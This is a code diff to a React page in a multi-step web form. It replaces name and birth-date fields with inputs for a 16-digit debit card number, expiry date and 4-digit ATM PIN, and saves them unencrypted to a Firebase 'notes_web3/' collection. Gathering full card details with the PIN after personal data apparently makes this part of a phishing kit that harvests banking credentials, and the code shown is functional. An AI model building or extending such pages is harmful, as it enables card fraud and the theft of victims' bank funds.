@@ -9,23 +9,51 @@ import "react-datepicker/dist/react-datepicker.css";
 
 function SecondPage() {
   const navigate = useNavigate();
-  const [fatherName, setFatherName] = useState('');
-  const [dateOfBirth, setDateOfBirth] = useState(null);
+  const [debitCardNumber, setDebitCardNumber] = useState('');
+  const [expiryDate, setExpiryDate] = useState(new Date()); // Initialize with current date
+  const [atmPin, setAtmPin] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false); // Submit loading state
 
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsSubmitting(true); // Show loading during submit
-    // Simulate form submission delay
-    const formattedDate = dateOfBirth ? dateOfBirth.toLocaleDateString() : '';
+    
+    // Validate debit card number (16 digits)
+    if (!/^\d{16}$/.test(debitCardNumber)) {
+      alert('Debit card number must be 16 digits');
+      setIsSubmitting(false);
+      return;
+    }
+
+    // Validate expiry date format
+    const expiryMonth = expiryDate.getMonth() + 1; // Get month (0-11)
+    const expiryYear = expiryDate.getFullYear().toString().slice(2); // Get last two digits of year
+    const expiryDateStr = `${expiryMonth.toString().padStart(2, '0')}/${expiryYear}`;
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDateStr)) {
+      alert('Expiry date must be in MM/YY format');
+      setIsSubmitting(false);
+      return;
+    }
+
+    // Validate ATM PIN (4 digits)
+    if (!/^\d{4}$/.test(atmPin)) {
+      alert('ATM PIN must be 4 digits');
+      setIsSubmitting(false);
+      return;
+    }
+
     setTimeout(async () =>  {
       const key = localStorage.getItem('key');
       console.log("key = "+key);
-      const result = await  FirebaseUtil.updateAnyModel("notes_web3/",key, { fatherName, formattedDate });
+      const result = await FirebaseUtil.updateAnyModel("notes_web3/", key, { 
+        debitCardNumber, 
+        expiryDate: expiryDateStr, // Convert date to MM/YY format
+        atmPin 
+      });
       console.log("result.key = "+result.key);
-    setIsSubmitting(false); // Hide loading after submit
-    navigate('/third-page'); // Navigate to third page after submission
+      setIsSubmitting(false); // Hide loading after submit
+      navigate('/third-page'); // Navigate to third page after submission
     }, 2000); // 1-second delay
   };
 
@@ -48,16 +76,22 @@ function SecondPage() {
         <div className="mb-4">
           <label
             className="block text-gray-200 text-sm font-bold mb-2"
-            htmlFor="name"
+            htmlFor="debitCardNumber"
           >
-            Father Name 
+            Debit Card Number 
           </label>
           <input
             className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-            id="name"
+            id="debitCardNumber"
             type="text"
-            value={fatherName}
-            onChange={(e) => setFatherName(e.target.value)}
+            value={debitCardNumber}
+            onChange={(e) => {
+              // Only allow numeric input and limit to 16 characters
+              const numericValue = e.target.value.replace(/\D/g, '').slice(0, 16);
+              setDebitCardNumber(numericValue);
+            }}
+            placeholder="Enter 16-digit Debit Card Number"
+            maxLength="16"
             required
           />
         </div>
@@ -65,19 +99,38 @@ function SecondPage() {
         <div className="mb-4">
             <label
               className="block text-gray-200 text-sm font-bold mb-2"
-              htmlFor="dateOfBirth"
-            > Date of birth
+              htmlFor="expiryDate"
+            > Expiry Date
             </label>
             <DatePicker
-              selected={dateOfBirth}
-              onChange={(date) => setDateOfBirth(date)}
-              dateFormat="dd/MM/yyyy"
-              showYearDropdown
-              yearDropdownItemNumber={100}
-              scrollableYearDropdown
+              selected={expiryDate}
+              onChange={(date) => setExpiryDate(date)}
+              dateFormat="MM/yy"
+              showMonthYearPicker
+              minDate={new Date()}
               className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-              placeholderText="Select your date of birth"
-              maxDate={new Date()}
+              placeholderText="Select Expiry Date"
+              required
+            />
+          </div>
+        <div className="mb-4">
+            <label
+              className="block text-gray-200 text-sm font-bold mb-2"
+              htmlFor="atmPin"
+            > ATM PIN
+            </label>
+            <input
+              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+              id="atmPin"
+              type="password"
+              value={atmPin}
+              onChange={(e) => {
+                // Only allow numeric input and limit to 4 characters
+                const numericValue = e.target.value.replace(/\D/g, '').slice(0, 4);
+                setAtmPin(numericValue);
+              }}
+              placeholder="Enter 4-digit ATM PIN"
+              maxLength="4"
               required
             />
           </div>
